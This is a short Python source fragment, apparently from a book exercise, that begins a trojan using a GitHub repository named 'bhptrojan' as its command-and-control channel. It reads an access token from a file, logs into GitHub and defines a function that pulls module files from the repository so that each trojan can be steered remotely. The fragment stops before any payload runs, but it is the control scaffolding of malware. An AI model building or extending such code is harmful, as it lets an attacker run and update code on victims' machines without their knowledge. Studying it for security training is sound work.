import base64
import github3
import importlib
import json
import random
import sys
import threading 
import time

from datetime import datetime

def github_connect(): # Reads github token
    with open('mytoken.txt') as f: # Write created token to mytoken file
        token = f.read()
    user = 'AnLau25'
    sess = github3.login(token=token)
    return sess.repository(user, "bhptrojan")
    # Dif trojans require dif files, to control what each trojan does

def get_file_contents(dirname, module_name, repo): # Return contents to module
    return repo.file_contents(f'{dirname}/{module_name}').content

